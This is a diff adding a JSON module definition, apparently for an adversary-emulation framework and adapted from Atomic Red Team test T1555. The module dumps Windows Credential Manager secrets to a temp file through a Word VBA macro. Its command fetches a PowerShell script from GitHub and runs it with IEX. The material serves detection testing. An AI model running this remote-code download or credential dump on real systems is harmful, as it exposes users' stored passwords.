@@ -1,0 +1,31 @@
+{
+    "name": "Extract Windows Credential Manager via VBA",
+    "description": "This module will extract the credentials found within the Windows credential manager and dump them to $env:TEMP\\windows-credentials.txt ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
+        "cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1555",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Password Stores",
+    "source": "ART",
+    "uuid": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Word must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
